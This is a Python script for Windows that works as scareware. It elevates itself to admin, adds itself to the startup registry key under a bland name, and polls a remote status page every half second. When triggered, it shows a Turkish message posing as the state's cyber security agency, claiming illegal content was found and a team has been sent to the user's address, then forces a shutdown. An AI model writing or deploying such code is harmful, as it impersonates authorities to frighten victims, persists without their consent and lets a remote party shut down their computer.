import os
import ctypes
import requests
from bs4 import BeautifulSoup
import time
import sys
import winreg as reg

def check_status():
    url = "https://yoursite.com/develop/status/index.php"

    try:
        response = requests.get(url)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')

        status_element = soup.find(id="status")
        status = status_element.get_text().strip()

        if status == "Status: 1":
            ctypes.windll.user32.MessageBoxW(0, "Bilgisayarda Yasadışı İçerik SİBERAY tarafından bulunmuştur. Adresinize ekip gönderilmiştir.", "T.C Siber Güvenlik", 100)
            time.sleep(5)
            os.system("shutdown /s /t 1")
        elif status == "Status: 0":
            print("0")
        else:
            print("Bilinmeyen Durum")

    except requests.exceptions.RequestException as e:
        print(f"Hata oluştu: {e}")

def add_to_startup(program_name, program_path):
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:

        key_handle = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)

        reg.SetValueEx(key_handle, program_name, 0, reg.REG_SZ, program_path)

        reg.CloseKey(key_handle)
        print(f"{program_name} başlangıçta açılacak şekilde ayarlandı.")
    except Exception as e:
        print(f"Hata: {e}")

if ctypes.windll.shell32.IsUserAnAdmin() != 0:
    program_name = "MyPythonProgram"
    program_path = os.path.abspath(sys.argv[0])
    add_to_startup(program_name, program_path)

    while True:
        check_status()
        time.sleep(0.5)

else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

